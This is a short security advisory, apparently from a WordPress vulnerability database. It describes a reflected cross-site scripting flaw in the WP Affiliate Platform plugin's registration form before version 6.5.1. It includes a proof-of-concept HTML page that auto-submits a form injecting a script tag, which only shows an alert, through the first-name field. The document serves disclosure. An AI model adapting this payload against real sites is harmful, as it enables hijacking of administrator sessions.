## WordPress Plugin Vulnerabilities

# WP Affiliate Platform < 6.5.1 - Reflected XSS via Registration Form

### Description

The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin

### Proof of Concept

Have any unauthenticated user open an HTML file containing:
```
<body onload="document.forms[0].submit()"><form action="https://example.com/wp-content/plugins/wp-affiliate-platform/affiliates/register.php" method="POST"><input type="text" name="afirstname" value='test"><script>alert(2)</script>'><input type="submit" value="submit"></form></body>
```
